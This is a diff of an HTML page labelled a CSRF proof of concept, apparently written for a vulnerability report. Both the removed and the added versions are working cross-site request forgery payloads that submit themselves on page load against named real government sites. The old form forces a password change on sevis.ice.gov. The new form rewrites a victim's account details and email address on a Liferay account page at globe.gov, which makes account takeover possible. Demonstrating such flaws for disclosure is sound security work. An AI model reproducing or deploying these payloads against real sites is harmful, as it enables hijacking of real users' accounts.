@@ -1,15 +1,35 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <form action="https://sevis.ice.gov/sevis/action/logonchangepassword" method="POST">
-      <input type="hidden" name="username" value="__crypto__FIFJbJBNOcKTuAQsw8PjvA__">
-      <input type="hidden" name="password" value="TESTing1234.">
-      <input type="hidden" name="com_user_password_1" value="Testing1234.">
-      <input type="hidden" name="com_user_password_2" value="Testing1234.">
-      <input type="submit" value="Submit CSRF">
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <form action="https://www.globe.gov/manage?p_p_id=com_liferay_my_account_web_portlet_MyAccountPortlet&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&_com_liferay_my_account_web_portlet_MyAccountPortlet_javax.portlet.action=%2Fusers_admin%2Fedit_user&p_p_auth=agaCVBGh" method="POST">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_formDate" value="1741938740093">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_redirect" value="https%3A%2F%2Fwww.globe.gov%3A443%2Fmanage%3Fp_p_id%3Dcom_liferay_my_account_web_portlet_MyAccountPortlet%26p_p_lifecycle%3D0%26p_p_state%3Dnormal%26p_p_mode%3Dview%26_com_liferay_my_account_web_portlet_MyAccountPortlet_mvcRenderCommandName%3D%252Fusers_admin%252Fedit_user%26_com_liferay_my_account_web_portlet_MyAccountPortlet_screenNavigationCategoryKey%3Dgeneral%26_com_liferay_my_account_web_portlet_MyAccountPortlet_backURL%3Dhttps%253A%252F%252Fwww.globe.gov%253A443%252Fmanage%253Fp_p_id%253Dcom_liferay_my_account_web_portlet_MyAccountPortlet%2526p_p_lifecycle%253D0%2526p_p_state%253Dnormal%2526p_p_mode%253Dview%2526p_p_auth%253DagaCVBGh%26_com_liferay_my_account_web_portlet_MyAccountPortlet_p_u_i_d%3D148877258%26p_p_auth%3DagaCVBGh">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_p_u_i_d" value="148877258">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_screenNavigationCategoryKey" value="general">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_screenNavigationEntryKey" value="">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_cmd" value="update">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_emailAddress" value="victimvictim123456@gmail.com">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_deleteLogo" value="false">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_fileEntryId" value="0">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_languageId" value="en_US">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_prefixValue" value="">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_firstName" value="victimaaaaa">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_middleName" value="">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_lastName" value="Scientist">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_suffixValue" value="">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_jobTitle" value="">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_birthdayMonth" value="0">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_birthdayDay" value="1">
+        <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_birthdayYear" value="1970">
+        <input type="hidden" name="p_auth" value="jf7GECFr">
+        <input type="submit" value="Submit CSRF">
     </form>
-
     <script>
-      document.forms[0].submit(); // Auto-submit the form when the victim visits the page
+        document.forms[0].submit();
     </script>
-  </body>
+</body>
 </html>
